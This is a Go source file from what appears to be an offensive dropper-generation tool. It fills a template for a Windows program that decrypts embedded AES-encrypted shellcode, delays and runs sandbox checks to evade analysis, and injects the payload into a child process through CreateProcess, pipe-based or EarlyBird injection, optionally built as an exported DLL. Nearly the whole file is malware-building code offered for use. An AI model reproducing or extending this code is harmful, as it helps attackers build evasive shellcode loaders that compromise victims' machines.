package child

import (
	"io"
	"log"
	"text/template"

	"github.com/Epictetus24/godropit/internal/gengo/delivery"
	"github.com/Epictetus24/godropit/pkg/dropfmt"
)

var Droppers = []string{"CreateProcess", "CreateProcessWithPipe", "EarlyBird"}

type ChildDropper struct {
	FuncName   string
	FileName   string
	KeyStr     string //EncryptionKey
	BufStr     string //Base64Shellcodestr
	ChildProc  string //Program Proc to Execute in
	Args       string //Args to pass to shellcode exec
	Delay      int
	Dlls       string
	BoxChkFunc string
	BoxChkImp  string
	ChkBox     string
	Inject     string
	Export     string
	Domain     string
	Import     string
	C          string
	ProcAttach string
	Init       string
}

var FuncName = "checkData"
var Export = "export"

const ChildMain = `package main

{{.C}}

import (
	{{.Import}}

	{{.BoxChkImp}}

)
var hope = "{{.Domain}}"

{{.BoxChkFunc}}

func init() {
	{{.ChkBox}}	
	{{.Init}}()
}
func main() {

	{{.FuncName}}()

}

//{{.Export}} {{.FuncName}}
func {{.FuncName}}() {

	program := "{{.ChildProc}}"
	args := "{{.Args}}"

	bufstring := "{{.BufStr}}"
	kstring := "{{.KeyStr}}"
	time.Sleep({{.Delay}}* time.Second)

	shellcode, err := box.AESDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}}* time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Inject}}
}
`

// Writes a child template, which usually includes a new process with arguments.
func (cd *ChildDropper) WriteSrc(writer io.Writer) error {
	tmpl, err := template.New("child").Parse(ChildMain)
	if err != nil {
		log.Fatalf("[child] Error writing template: %v\n", err)
		return err
	}
	cd.FuncName = FuncName
	cd.Export = ""
	cd.C = ""
	err = tmpl.Execute(writer, cd)
	return nil

}

func (cd *ChildDropper) WriteSharedSrc(writer io.Writer) error {
	tmpl, err := template.New("child").Parse(ChildMain)
	if err != nil {
		return err
	}
	cd.C = delivery.DllImport
	cd.ProcAttach = delivery.DllFunc
	cd.FuncName = FuncName
	cd.Export = Export
	cd.Init = cd.FuncName
	err = tmpl.Execute(writer, cd)
	return nil

}

func NewChild(args, proc, domain string, delay int) ChildDropper {
	var cD ChildDropper
	cD.Args = args
	cD.ChildProc = proc
	cD.Delay = delay

	_, selected, _ := dropfmt.PromptList(Droppers, "Select the child dropper you would like to use:")

	switch selected {
	case "CreateProcess":
		cD.Dlls = CreateProcessDlls
		cD.Inject = CreateProcess
		cD.Import = CreateProcessImports
	case "CreateProcessWithPipe":
		cD.Dlls = CreateProcWithPipeDlls
		cD.Inject = CreateProcWithPipe
		cD.Import = CreateProcWithPipeImports
	case "EarlyBird":
		cD.Dlls = EarlyBirdDlls
		cD.Inject = EarlyBird
		cD.Import = EarlyBirdImports
	}

	return cD
}
